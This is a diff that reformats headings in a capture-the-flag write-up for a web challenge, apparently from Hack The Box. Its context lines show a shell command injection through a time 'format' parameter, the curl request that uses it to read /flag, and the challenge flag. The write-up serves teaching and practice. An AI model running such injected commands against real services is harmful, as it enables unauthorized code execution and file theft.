@@ -46,7 +46,7 @@ I tried poking at it to assess if it could be an attack vector but didn't seem l
 
 The challenge also provided with the application source code that I could download and understand how it worked. So, that' what I did next.
 
-# Examining the source code
+# Examining the Source Code
 Here's what the directory structure looked like:
 ```
 $ tree .
@@ -168,7 +168,7 @@ CMD /usr/bin/supervisord -c /etc/supervisord.conf
 ```
 `COPY flag /flag` indicated that the file was available at `/flag` on the remote target.
 
-# Exploiting the vuln and challenge solution
+# Exploit and Solve
 I needed to craft an exploit string in a way that would let me "break out" of the quotes and then execute commands. So I wrote `';cat /flag'` and the final input to the application became
 ```
 /?format=%H:%M:%S';cat /flag'
@@ -178,7 +178,7 @@ On the server side, command that would get executed would look like
 date '%H:%M:%S';cat /flag'' 2>&1
 ```
 
-Solve:
+Solve
 
 ```
 $ curl "http://165.227.225.92:32449/?format=%H:%M:%S';cat /flag'" | grep 'HTB'
@@ -189,6 +189,4 @@ $ curl "http://165.227.225.92:32449/?format=%H:%M:%S';cat /flag'" | grep 'HTB'
         <h1 class="jumbotron-heading">><span class='text-muted'>It's</span> HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}<span class='text-muted'>.</span></h1>
 ```
 
-Flag:
-
-`HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}`
+Flag - `HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}`
